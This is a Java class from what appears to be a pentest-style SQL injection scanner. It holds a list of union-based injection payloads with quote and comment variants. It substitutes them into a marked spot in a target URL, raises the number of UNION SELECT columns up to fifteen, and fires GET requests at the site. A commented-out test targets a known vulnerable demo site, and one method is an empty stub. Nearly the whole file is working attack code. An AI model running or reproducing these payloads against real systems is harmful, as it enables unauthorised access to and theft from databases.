/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ControladorMySql;

import static ControladorMySql.PrincipalMySql.enviaGet;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author x01k
 */
public class UnionBased {

    private String url; // Variavel que recebe as url temporariamente

    // Método construtor padrão
    public UnionBased() {
    }

    // Método construtor que recebe Url
    public UnionBased(String url) {
        setUrl(url); // Envia a url para o metodo setUrl
        new Thread(iniciaTeste).start(); // Inicia uma Thread com o método iniciaTeste
    }

    // Método getter 
    private String getUrl() {
        return url; // retorna a variavel
    }

    // Método setter 
    private void setUrl(String url) {
        this.url = url; // Setando a url na variavel
    }
    // Método que inicia o teste
    private Runnable iniciaTeste = new Runnable() {
        @Override
        public void run() {
            UnionInteger(getUrl());
            //getUnion(getUrl()); // Enviando a url para o metodo get
        }
    };


//    public static void main(String[] args) {
//        teste();
//    }

//    public static void teste() {
//        UnionBased based = new UnionBased();
//        String url = "http://testphp.vulnweb.com/listproducts.php?cat=9!-!";
//        based.UnionInteger(url);
//    }
    private String UnionStyles[]
            = {"999999.9+union+all+select+[t]",
                "999999.9+union+all+select+[t]+and+'0'='0",
                "999999.9+union+all+select+[t]--",
                "999999.9+union+all+select+[t]+and+'0'='0--",
                "999999.9%22+union+all+select+[t]+and+'0'='0",
                "999999.9)+union+all+select+[t]+and+(0=0",
                "999999.9+union+all+select+[t]+#",
                "999999.9'+union+all+select+[t]+and+'0'='0+#",};
    private int nColunas = 15;

    private void UnionInteger(String url) {
        String recebeUrl = null;
        String unionTemporario = null;
        for (String styles : UnionStyles) {
            String codHexadecimal = "0x54434350656e74657374";
            for (int i = 0; i < nColunas; i++) {
                try {
                    recebeUrl = url;
                    if (recebeUrl.contains("!-!")) {
                        if (i < 1) {
                            unionTemporario = styles.replace("[t]", codHexadecimal);
                        } else {
                            codHexadecimal += "," + "0x54434350656e74657374";
                            unionTemporario = styles.replace("[t]", codHexadecimal);
                        }
                    }
                    //System.out.println(recebeUrl.replaceAll("!-!", unionTemporario));
                    enviaGet(recebeUrl.replaceAll("!-!", unionTemporario));
                } catch (Exception e) {
                    Logger.getLogger(UnionBased.class.getName()).log(Level.SEVERE, null, e);
                }
            }
        }
    }        
    private void UnionKeyword(String url){
        
    }
}
